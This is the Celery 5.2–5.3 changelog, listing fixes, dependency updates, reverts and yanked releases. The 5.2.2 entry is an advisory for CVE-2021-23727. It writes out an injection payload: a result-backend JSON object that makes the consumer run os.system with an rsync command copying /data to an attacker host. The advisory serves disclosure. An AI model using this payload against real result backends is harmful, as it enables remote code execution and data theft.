.. _changelog:

================
 Change history
================

This document contains change notes for bugfix & new features
in the main branch & 5.3.x series, please see :ref:`whatsnew-5.3` for
an overview of what's new in Celery 5.3.

.. _version-5.3.4:

5.3.4
=====

:release-date: 2023-09-03 10:10 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:

   - Revert "store children with database backend" (#8475)
   - Revert "Fix eager tasks does not populate name field" (#8476)

- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)
- User guide fix (hotfix for #1755) (#8342)
- store children with database backend (#8338)
- Stamping bugfix with group/chord header errback linking (#8347)
- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)
- Fixing minor typo in code example in calling.rst (#8366)
- add documents for timeout settings (#8373)
- fix: copyright year (#8380)
- setup.py: enable include_package_data (#8379)
- Fix eager tasks does not populate name field (#8383)
- Update test.txt dependencies (#8389)
- Update auth.txt deps (#8392)
- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)
- Support preload options for shell and purge commands (#8374)
- Implement safer ArangoDB queries (#8351)
- integration test: cleanup worker after test case (#8361)
- Added "Tomer Nosrati" to CONTRIBUTORS.txt (#8400)
- Update README.rst (#8404)
- Update README.rst (#8408)
- fix(canvas): add group index when unrolling tasks (#8427)
- fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)
- Lint fixes & pre-commit autoupdate (#8414)
- Update auth.txt (#8435)
- Update mypy on test.txt (#8438)
- added missing kwargs arguments in some cli cmd (#8049)
- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)
- Docs: rewrite out-of-date code (#8441)
- Limit redis client to 4.x since 5.x fails the test suite (#8442)
- Limit tox to < 4.9 (#8443)
- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)
- doc update from #7651 (#8451)
- Remove tox version limit (#8464)
- Fixed AttributeError: 'str' object has no attribute (#8463)
- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)
- Document need for CELERY_ prefix on CLI env vars (#8469)
- Use string value for CELERY_SKIP_CHECKS envvar (#8462)
- Revert "store children with database backend" (#8475)
- Revert "Fix eager tasks does not populate name field" (#8476)
- Update Changelog (#8474)
- Remove as it seems to be buggy. (#8340)
- Revert "Add Semgrep to CI" (#8477)
- Revert "Revert "Add Semgrep to CI"" (#8478)

.. _version-5.3.3:

5.3.3 (Yanked)
==============

:release-date: 2023-08-31 1:47 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has been yanked due to breaking API changes. The breaking changes include:

   - Store children with database backend (#8338)
   - Fix eager tasks does not populate name field (#8383)

- Fixed changelog for 5.3.2 release docs.

.. _version-5.3.2:

5.3.2 (Yanked)
==============

:release-date: 2023-08-31 1:30 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has been yanked due to breaking API changes. The breaking changes include:

   - Store children with database backend (#8338)
   - Fix eager tasks does not populate name field (#8383)

- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)
- User guide fix (hotfix for #1755) (#8342)
- Store children with database backend (#8338)
- Stamping bugfix with group/chord header errback linking (#8347)
- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)
- Fixing minor typo in code example in calling.rst (#8366)
- Add documents for timeout settings (#8373)
- Fix: copyright year (#8380)
- Setup.py: enable include_package_data (#8379)
- Fix eager tasks does not populate name field (#8383)
- Update test.txt dependencies (#8389)
- Update auth.txt deps (#8392)
- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)
- Support preload options for shell and purge commands (#8374)
- Implement safer ArangoDB queries (#8351)
- Integration test: cleanup worker after test case (#8361)
- Added "Tomer Nosrati" to CONTRIBUTORS.txt (#8400)
- Update README.rst (#8404)
- Update README.rst (#8408)
- Fix(canvas): add group index when unrolling tasks (#8427)
- Fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)
- Lint fixes & pre-commit autoupdate (#8414)
- Update auth.txt (#8435)
- Update mypy on test.txt (#8438)
- Added missing kwargs arguments in some cli cmd (#8049)
- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)
- Docs: rewrite out-of-date code (#8441)
- Limit redis client to 4.x since 5.x fails the test suite (#8442)
- Limit tox to < 4.9 (#8443)
- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)
- Doc update from #7651 (#8451)
- Remove tox version limit (#8464)
- Fixed AttributeError: 'str' object has no attribute (#8463)
- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)

.. _version-5.3.1:

5.3.1
=====

:release-date: 2023-06-18  8:15 P.M GMT+6
:release-by: Asif Saif Uddin

- Upgrade to latest pycurl release (#7069).
- Limit librabbitmq>=2.0.0; python_version < '3.11' (#8302).
- Added initial support for python 3.11 (#8304).
- ChainMap observers fix (#8305).
- Revert optimization CLI flag behaviour back to original.
- Restrict redis 4.5.5 as it has severe bugs (#8317).
- Tested pypy 3.10 version in CI (#8320).
- Bump new version of kombu to 5.3.1 (#8323).
- Fixed a small float value of retry_backoff (#8295).
- Limit pyro4 up to python 3.10 only as it is (#8324).

.. _version-5.3.0:

5.3.0
=====

:release-date: 2023-06-06 12:00 P.M GMT+6
:release-by: Asif Saif Uddin

- Test kombu 5.3.0 & minor doc update (#8294).
- Update librabbitmq.txt > 2.0.0 (#8292).
- Upgrade syntax to py3.8 (#8281).

.. _version-5.3.0rc2:

5.3.0rc2
========

:release-date: 2023-05-31 9:00 P.M GMT+6
:release-by: Asif Saif Uddin

- Add missing dependency.
- Fix exc_type being the exception instance rather.
- Fixed revoking tasks by stamped headers (#8269).
- Support sqlalchemy 2.0 in tests (#8271).
- Fix docker (#8275).
- Update redis.txt to 4.5 (#8278).
- Update kombu>=5.3.0rc2.


.. _version-5.3.0rc1:

5.3.0rc1
========

:release-date: 2023-05-11 4:24 P.M GMT+2
:release-by: Tomer Nosrati

- fix functiom name by @cuishuang in #8087
- Update CELERY_TASK_EAGER setting in user guide by @thebalaa in #8085
- Stamping documentation fixes & cleanups by @Nusnus in #8092
- switch to maintained pyro5 by @auvipy in #8093
- udate dependencies of tests by @auvipy in #8095
- cryptography==39.0.1 by @auvipy in #8096
- Annotate celery/security/certificate.py by @Kludex in #7398
- Deprecate parse_iso8601 in favor of fromisoformat by @stumpylog in #8098
- pytest==7.2.2 by @auvipy in #8106
- Type annotations for celery/utils/text.py by @max-muoto in #8107
- Update web framework URLs by @sblondon in #8112
- Fix contribution URL by @sblondon in #8111
- Trying to clarify CERT_REQUIRED by @pamelafox in #8113
- Fix potential AttributeError on 'stamps' by @Darkheir in #8115
- Type annotations for celery/apps/beat.py by @max-muoto in #8108
- Fixed bug where retrying a task loses its stamps by @Nusnus in #8120
- Type hints for celery/schedules.py by @max-muoto in #8114
- Reference Gopher Celery in README by @marselester in #8131
- Update sqlalchemy.txt by @auvipy in #8136
- azure-storage-blob 12.15.0 by @auvipy in #8137
- test kombu 5.3.0b3 by @auvipy in #8138
- fix: add expire string parse. by @Bidaya0 in #8134
- Fix worker crash on un-pickleable exceptions by @youtux in #8133
- CLI help output: avoid text rewrapping by click by @woutdenolf in #8152
- Warn when an unnamed periodic task override another one. by @iurisilvio in #8143
- Fix Task.handle_ignore not wrapping exceptions properly by @youtux in #8149
- Hotfix for (#8120) - Stamping bug with retry by @Nusnus in #8158
- Fix integration test by @youtux in #8156
- Fixed bug in revoke_by_stamped_headers where impl did not match doc by @Nusnus in #8162
- Align revoke and revoke_by_stamped_headers return values (terminate=True) by @Nusnus in #8163
- Update & simplify GHA pip caching by @stumpylog in #8164
- Update auth.txt by @auvipy in #8167
- Update test.txt versions by @auvipy in #8173
- remove extra = from test.txt by @auvipy in #8179
- Update sqs.txt kombu[sqs]>=5.3.0b3 by @auvipy in #8174
- Added signal triggered before fork by @jaroslawporada in #8177
- Update documentation on SQLAlchemy by @max-muoto in #8188
- Deprecate pytz and use zoneinfo by @max-muoto in #8159
- Update dev.txt by @auvipy in #8192
- Update test.txt by @auvipy in #8193
- Update test-integration.txt by @auvipy in #8194
- Update zstd.txt by @auvipy in #8195
- Update s3.txt by @auvipy in #8196
- Update msgpack.txt by @auvipy in #8199
- Update solar.txt by @auvipy in #8198
- Add Semgrep to CI by @Nusnus in #8201
- Added semgrep to README.rst by @Nusnus in #8202
- Update django.txt by @auvipy in #8197
- Update redis.txt 4.3.6 by @auvipy in #8161
- start removing codecov from pypi by @auvipy in #8206
- Update test.txt dependencies by @auvipy in #8205
- Improved doc for: worker_deduplicate_successful_tasks by @Nusnus in #8209
- Renamed revoked_headers to revoked_stamps by @Nusnus in #8210
- Ensure argument for map is JSON serializable by @candleindark in #8229

.. _version-5.3.0b2:

5.3.0b2
=======

:release-date: 2023-02-19 1:47 P.M GMT+2
:release-by: Asif Saif Uddin

- BLM-2: Adding unit tests to chord clone by @Nusnus in #7668
- Fix unknown task error typo by @dcecile in #7675
- rename redis integration test class so that tests are executed by @wochinge in #7684
- Check certificate/private key type when loading them by @qrmt in #7680
- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by @Nusnus in #7692
- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by @Nusnus in #7712
- Update README.rst sorting Python/Celery versions by @andrebr in #7714
- Fixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in #7722
- Fixed doc duplication typo for Signature.stamp() by @Nusnus in #7725
- Fix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in #7727
- Fixed bug in chord stamping with another chord as a body + unit test by @Nusnus in #7730
- Use "describe_table" not "create_table" to check for existence of DynamoDB table by @maxfirman in #7734
- Enhancements for task_allow_error_cb_on_chord_header tests and docs by @Nusnus in #7744
- Improved custom stamping visitor documentation by @Nusnus in #7745
- Improved the coverage of test_chord_stamping_body_chord() by @Nusnus in #7748
- billiard >= 3.6.3.0,<5.0 for rpm by @auvipy in #7764
- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by @Nusnus in #7771
- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by @Nusnus in #7772
- Scheduled weekly dependency update for week 38 by @pyup-bot in #7767
- recreate_module: set spec to the new module by @skshetry in #7773
- Override integration test config using integration-tests-config.json by @thedrow in #7778
- Fixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in #7781
- Do not recommend using easy_install anymore by @jugmac00 in #7789
- GitHub Workflows security hardening by @sashashura in #7768
- Update ambiguous acks_late doc by @Zhong-z in #7728
- billiard >=4.0.2,<5.0 by @auvipy in #7720
- importlib_metadata remove deprecated entry point interfaces by @woutdenolf in #7785
- Scheduled weekly dependency update for week 41 by @pyup-bot in #7798
- pyzmq>=22.3.0 by @auvipy in #7497
- Remove amqp from the BACKEND_ALISES list by @Kludex in #7805
- Replace print by logger.debug by @Kludex in #7809
- Ignore coverage on except ImportError by @Kludex in #7812
- Add mongodb dependencies to test.txt by @Kludex in #7810
- Fix grammar typos on the whole project by @Kludex in #7815
- Remove isatty wrapper function by @Kludex in #7814
- Remove unused variable _range by @Kludex in #7813
- Add type annotation on concurrency/threads.py by @Kludex in #7808
- Fix linter workflow by @Kludex in #7816
- Scheduled weekly dependency update for week 42 by @pyup-bot in #7821
- Remove .cookiecutterrc by @Kludex in #7830
- Remove .coveragerc file by @Kludex in #7826
- kombu>=5.3.0b2 by @auvipy in #7834
- Fix readthedocs build failure by @woutdenolf in #7835
- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in #7825
- Stabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by @Nusnus in #7837
- Use SPDX license expression in project metadata by @RazerM in #7845
- New control command revoke_by_stamped_headers by @Nusnus in #7838
- Clarify wording in Redis priority docs by @strugee in #7853
- Fix non working example of using celery_worker pytest fixture by @paradox-lab in #7857
- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by @Nusnus in #7856
- Update serializer docs by @sondrelg in #7858
- Remove reference to old Python version by @Kludex in #7829
- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in #7860
- Add clarifying information to completed_count documentation by @hankehly in #7873
- Stabilized test_revoked_by_headers_complex_canvas by @Nusnus in #7877
- StampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in #7867
- Fix "rm: no operand" error in clean-pyc script by @hankehly in #7878
- Add --skip-checks flag to bypass django core checks by @mudetz in #7859
- Scheduled weekly dependency update for week 44 by @pyup-bot in #7868
- Added two new unit tests to callback stamping by @Nusnus in #7882
- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in #7879
- cryptography==38.0.3 by @auvipy in #7886
- Canvas.py doc enhancement by @Nusnus in #7889
- Fix typo by @sondrelg in #7890
- fix typos in optional tests by @hsk17 in #7876
- Canvas.py doc enhancement by @Nusnus in #7891
- Fix revoke by headers tests stability by @Nusnus in #7892
- feat: add global keyprefix for backend result keys by @kaustavb12 in #7620
- Canvas.py doc enhancement by @Nusnus in #7897
- fix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in #7899
- Canvas.py doc enhancement by @Nusnus in #7902
- Fix test warnings by @ShaheedHaque in #7906
- Support for out-of-tree worker pool implementations by @ShaheedHaque in #7880
- Canvas.py doc enhancement by @Nusnus in #7907
- Use bound task in base task example. Closes #7909 by @WilliamDEdwards in #7910
- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in #7914
- Stamping a task left the task properties dirty by @Nusnus in #7916
- Fixed bug when chaining a chord with a group by @Nusnus in #7919
- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by @Nusnus in #7928
- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by @Nusnus in #7929
- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by @Nusnus in #7930
- Added integration test: test_all_tasks_of_canvas_are_stamped() by @Nusnus in #7931
- Added new example for the stamping mechanism: examples/stamping by @Nusnus in #7933
- Fixed a bug where replacing a stamped task and stamping it again by @Nusnus in #7934
- Bugfix for nested group stamping on task replace by @Nusnus in #7935
- Added integration test test_stamping_example_canvas() by @Nusnus in #7937
- Fixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in #7938
- Removing as not mandatory by @auvipy in #7885
- Housekeeping for Canvas.py by @Nusnus in #7942
- Scheduled weekly dependency update for week 50 by @pyup-bot in #7954
- try pypy 3.9 in CI by @auvipy in #7956
- sqlalchemy==1.4.45 by @auvipy in #7943
- billiard>=4.1.0,<5.0 by @auvipy in #7957
- feat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in #7952
- Add broker_channel_error_retry option by @nkns165 in #7951
- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by @abs25 in #7945
- Scheduled weekly dependency update for week 51 by @pyup-bot in #7965
- Added doc to "retry_errors" newly supported field of "publish_retry_policy" of the task namespace by @Nusnus in #7967
- Renamed from master to main in the docs and the CI workflows by @Nusnus in #7968
- Fix docs for the exchange to use with worker_direct by @alessio-b2c2 in #7973
- Pin redis==4.3.4 by @auvipy in #7974
- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in #7978
- use version range redis>=4.2.2,<4.4.0 by @auvipy in #7980
- Scheduled weekly dependency update for week 01 by @pyup-bot in #7987
- Add annotations to minimise differences with celery-aio-pool's tracer.py. by @ShaheedHaque in #7925
- Fixed bug where linking a stamped task did not add the stamp to the link's options by @Nusnus in #7992
- sqlalchemy==1.4.46 by @auvipy in #7995
- pytz by @auvipy in #8002
- Fix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in #8023
- RabbitMQ links update by @arnisjuraga in #8031
- Ignore files generated by tests by @Kludex in #7846
- Revert "sqlalchemy==1.4.46 (#7995)" by @Nusnus in #8033
- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in #8034
- Fixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in #8044
- Removed duplicated import Iterable by @Nusnus in #8046
- Fix docs by @Nusnus in #8047
- Document --logfile default by @strugee in #8057
- Stamping Mechanism Refactoring by @Nusnus in #8045
- result_backend_thread_safe config shares backend across threads by @CharlieTruong in #8058
- Fix cronjob that use day of month and negative UTC timezone by @pkyosx in #8053
- Stamping Mechanism Examples Refactoring by @Nusnus in #8060
- Fixed bug in Task.on_stamp_replaced() by @Nusnus in #8061
- Stamping Mechanism Refactoring 2 by @Nusnus in #8064
- Changed default append_stamps from True to False (meaning duplicates … by @Nusnus in #8068
- typo in comment: mailicious => malicious by @yanick in #8072
- Fix command for starting flower with specified broker URL by @ShukantPal in #8071
- Improve documentation on ETA/countdown tasks (#8069) by @norbertcyran in #8075

.. _version-5.3.0b1:

5.3.0b1
=======

:release-date: 2022-08-01 5:15 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Canvas Header Stamping (#7384).
- async chords should pass it's kwargs to the group/body.
- beat: Suppress banner output with the quiet option (#7608).
- Fix honor Django's TIME_ZONE setting.
- Don't warn about DEBUG=True for Django.
- Fixed the on_after_finalize cannot access tasks due to deadlock.
- Bump kombu>=5.3.0b1,<6.0.
- Make default worker state limits configurable (#7609).
- Only clear the cache if there are no active writers.
- Billiard 4.0.1

.. _version-5.3.0a1:

5.3.0a1
=======

:release-date: 2022-06-29 5:15 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Remove Python 3.4 compatibility code.
- call ping to set connection attr for avoiding redis parse_response error.
- Use importlib instead of deprecated pkg_resources.
- fix #7245 uid duplicated in command params.
- Fix subscribed_to maybe empty (#7232).
- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) #7290.
- Add security_key_password option (#7292).
- Limit elasticsearch support to below version 8.0.
- try new major release of pytest 7 (#7330).
- broker_connection_retry should no longer apply on startup (#7300).
- Remove __ne__ methods (#7257).
- fix #7200 uid and gid.
- Remove exception-throwing from the signal handler.
- Add mypy to the pipeline (#7383).
- Expose more debugging information when receiving unknown tasks. (#7405)
- Avoid importing buf_t from billiard's compat module as it was removed.
- Avoid negating a constant in a loop. (#7443)
- Ensure expiration is of float type when migrating tasks (#7385).
- load_extension_class_names - correct module_name (#7406)
- Bump pymongo[srv]>=4.0.2.
- Use inspect.getgeneratorstate in asynpool.gen_not_started (#7476).
- Fix test with missing .get() (#7479).
- azure-storage-blob>=12.11.0
- Make start_worker, setup_default_app reusable outside of pytest.
- Ensure a proper error message is raised when id for key is empty (#7447).
- Crontab string representation does not match UNIX crontab expression.
- Worker should exit with ctx.exit to get the right exitcode for non-zero.
- Fix expiration check (#7552).
- Use callable built-in.
- Include dont_autoretry_for option in tasks. (#7556)
- fix: Syntax error in arango query.
- Fix custom headers propagation on task retries (#7555).
- Silence backend warning when eager results are stored.
- Reduce prefetch count on restart and gradually restore it (#7350).
- Improve workflow primitive subclassing (#7593).
- test kombu>=5.3.0a1,<6.0 (#7598).
- Canvas Header Stamping (#7384).

.. _version-5.2.7:

5.2.7
=====

:release-date: 2022-5-26 12:15 P.M UTC+2:00
:release-by: Omer Katz

- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (#7534).

.. _version-5.2.6:

5.2.6
=====

:release-date: 2022-4-04 21:15 P.M UTC+2:00
:release-by: Omer Katz

- load_extension_class_names - correct module_name (#7433).
    This fixes a regression caused by #7218.

.. _version-5.2.5:

5.2.5
=====

:release-date: 2022-4-03 20:42 P.M UTC+2:00
:release-by: Omer Katz

**This release was yanked due to a regression caused by the PR below**

- Use importlib instead of deprecated pkg_resources (#7218).

.. _version-5.2.4:

5.2.4
=====

:release-date: 2022-4-03 20:30 P.M UTC+2:00
:release-by: Omer Katz

- Expose more debugging information when receiving unknown tasks (#7404).

.. _version-5.2.3:

5.2.3
=====

:release-date: 2021-12-29 12:00 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Allow redis >= 4.0.2.
- Upgrade minimum required pymongo version to 3.11.1.
- tested pypy3.8 beta (#6998).
- Split Signature.__or__ into subclasses' __or__ (#7135).
- Prevent duplication in event loop on Consumer restart.
- Restrict setuptools>=59.1.1,<59.7.0.
- Kombu bumped to v5.2.3
- py-amqp bumped to v5.0.9
- Some docs & CI improvements.


.. _version-5.2.2:

5.2.2
=====

:release-date: 2021-12-26 16:30 P.M UTC+2:00
:release-by: Omer Katz

- Various documentation fixes.
- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).

    When a task fails, the failure information is serialized in the backend.
    In some cases, the exception class is only importable from the
    consumer's code base. In this case, we reconstruct the exception class
    so that we can re-raise the error on the process which queried the
    task's result. This was introduced in #4836.
    If the recreated exception type isn't an exception, this is a security issue.
    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
    by setting the task's result to a failure in the result backend with the os,
    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:

    .. code-block:: python

        {
              "exc_module": "os",
              'exc_type': "system",
              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        }

    According to my analysis, this vulnerability can only be exploited if
    the producer delayed a task which runs long enough for the
    attacker to change the result mid-flight, and the producer has
    polled for the task's result.
    The attacker would also have to gain access to the result backend.
    The severity of this security vulnerability is low, but we still
    recommend upgrading.


.. _version-5.2.1:

5.2.1
=====

:release-date: 2021-11-16 8.55 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Fix rstrip usage on bytes instance in ProxyLogger.
- Pass logfile to ExecStop in celery.service example systemd file.
- fix: reduce latency of AsyncResult.get under gevent (#7052)
- Limit redis version: <4.0.0.
- Bump min kombu version to 5.2.2.
- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.
- Remove dependency to case (#7077).
- fix: task expiration is timezone aware if needed (#7065).
- Initial testing of pypy-3.8 beta to CI.
- Docs, CI & tests cleanups.


.. _version-5.2.0:

5.2.0
=====

:release-date: 2021-11-08 7.15 A.M UTC+6:00
:release-by: Asif Saif Uddin

- Prevent from subscribing to empty channels (#7040)
- fix register_task method.
- Fire task failure signal on final reject (#6980)
- Limit pymongo version: <3.12.1 (#7041)
- Bump min kombu version to 5.2.1

.. _version-5.2.0rc2:

5.2.0rc2
========

:release-date: 2021-11-02 1.54 P.M UTC+3:00
:release-by: Naomi Elstein

- Bump Python 3.10.0 to rc2.
- [pre-commit.ci] pre-commit autoupdate (#6972).
- autopep8.
- Prevent worker to send expired revoked items upon hello command (#6975).
- docs: clarify the 'keeping results' section (#6979).
- Update deprecated task module removal in 5.0 documentation (#6981).
- [pre-commit.ci] pre-commit autoupdate.
- try python 3.10 GA.
- mention python 3.10 on readme.
- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.
- Azure blockblob backend parametrized connection/read timeouts (#6978).
- Add as_uri method to azure block blob backend.
- Add possibility to override backend implementation with celeryconfig (#6879).
- [pre-commit.ci] pre-commit autoupdate.
- try to fix deprecation warning.
- [pre-commit.ci] pre-commit autoupdate.
- not needed anyore.
- not needed anyore.
- not used anymore.
- add github discussions forum

.. _version-5.2.0rc1:

5.2.0rc1
========
:release-date: 2021-09-26 4.04 P.M UTC+3:00
:release-by: Omer Katz

- Kill all workers when main process exits in prefork model (#6942).
- test kombu 5.2.0rc1 (#6947).
- try moto 2.2.x (#6948).
- Prepared Hacker News Post on Release Action.
- update setup with python 3.7 as minimum.
- update kombu on setupcfg.
- Added note about automatic killing all child processes of worker after its termination.
- [pre-commit.ci] pre-commit autoupdate.
- Move importskip before greenlet import (#6956).
- amqp: send expiration field to broker if requested by user (#6957).
- Single line drift warning.
- canvas: fix kwargs argument to prevent recursion (#6810) (#6959).
- Allow to enable Events with app.conf mechanism.
- Warn when expiration date is in the past.
- Add the Framework :: Celery trove classifier.
- Give indication whether the task is replacing another (#6916).
- Make setup.py executable.
- Bump version: 5.2.0b3 → 5.2.0rc1.

.. _version-5.2.0b3:

5.2.0b3
=======

:release-date: 2021-09-02 8.38 P.M UTC+3:00
:release-by: Omer Katz

- Add args to LOG_RECEIVED (fixes #6885) (#6898).
- Terminate job implementation for eventlet concurrency backend (#6917).
- Add cleanup implementation to filesystem backend (#6919).
- [pre-commit.ci] pre-commit autoupdate (#69).
- Add before_start hook (fixes #4110) (#6923).
- Restart consumer if connection drops (#6930).
- Remove outdated optimization documentation (#6933).
- added https verification check functionality in arangodb backend (#6800).
- Drop Python 3.6 support.
- update supported python versions on readme.
- [pre-commit.ci] pre-commit autoupdate (#6935).
- Remove appveyor configuration since we migrated to GA.
- pyugrade is now set to upgrade code to 3.7.
- Drop exclude statement since we no longer test with pypy-3.6.
- 3.10 is not GA so it's not supported yet.
- Celery 5.1 or earlier support Python 3.6.
- Fix linting error.
- fix: Pass a Context when chaining fail results (#6899).
- Bump version: 5.2.0b2 → 5.2.0b3.

.. _version-5.2.0b2:

5.2.0b2
=======

:release-date: 2021-08-17 5.35 P.M UTC+3:00
:release-by: Omer Katz

- Test windows on py3.10rc1 and pypy3.7 (#6868).
- Route chord_unlock task to the same queue as chord body (#6896).
- Add message properties to app.tasks.Context (#6818).
- handle already converted LogLevel and JSON (#6915).
- 5.2 is codenamed dawn-chorus.
- Bump version: 5.2.0b1 → 5.2.0b2.

.. _version-5.2.0b1:

5.2.0b1
=======

:release-date: 2021-08-11 5.42 P.M UTC+3:00
:release-by: Omer Katz

- Add Python 3.10 support (#6807).
- Fix docstring for Signal.send to match code (#6835).
- No blank line in log output (#6838).
- Chords get body_type independently to handle cases where body.type does not exist (#6847).
- Fix #6844 by allowing safe queries via app.inspect().active() (#6849).
- Fix multithreaded backend usage (#6851).
- Fix Open Collective donate button (#6848).
- Fix setting worker concurrency option after signal (#6853).
- Make ResultSet.on_ready promise hold a weakref to self (#6784).
- Update configuration.rst.
- Discard jobs on flush if synack isn't enabled (#6863).
- Bump click version to 8.0 (#6861).
- Amend IRC network link to Libera (#6837).
- Import celery lazily in pytest plugin and unignore flake8 F821, "undefined name '...'" (#6872).
- Fix inspect --json output to return valid json without --quiet.
- Remove celery.task references in modules, docs (#6869).
-  The Consul backend must correctly associate requests and responses (#6823).
